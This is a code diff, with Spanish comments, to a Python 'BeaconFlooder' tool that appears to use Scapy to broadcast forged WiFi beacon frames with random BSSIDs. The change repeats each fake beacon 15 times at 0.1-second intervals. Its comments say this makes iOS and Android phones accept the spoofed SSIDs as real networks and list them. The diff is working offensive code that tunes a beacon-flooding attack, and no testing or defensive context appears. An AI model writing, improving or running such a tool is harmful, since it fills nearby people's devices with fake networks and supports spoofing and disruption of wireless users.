@@ -130,6 +130,12 @@ class BeaconFlooder:
         count = 0
         last_report = time.time()
 
+        # Cuántas veces repetir cada SSID/BSSID antes de rotar.
+        # iOS/Android necesitan ver el mismo BSSID durante ~10 beacons
+        # (aprox. 1-2 segundos al ritmo estándar de 10 beacons/s) para
+        # considerarlo una red real y mostrarlo en la lista WiFi.
+        REPEATS_PER_AP = 15
+
         while self.running:
             ssid = self._pick_ssid()
             bssid = _random_mac()
@@ -142,9 +148,11 @@ class BeaconFlooder:
 
             try:
                 pkt = self._build_beacon(ssid, bssid, ch)
-                sendp(pkt, iface=self.interface, count=1,
-                      verbose=False)
-                count += 1
+                # Enviar el mismo beacon varias veces para que el móvil
+                # lo reconozca como una red estable
+                sendp(pkt, iface=self.interface, count=REPEATS_PER_AP,
+                      inter=0.1, verbose=False)
+                count += REPEATS_PER_AP
             except Exception:
                 pass
 
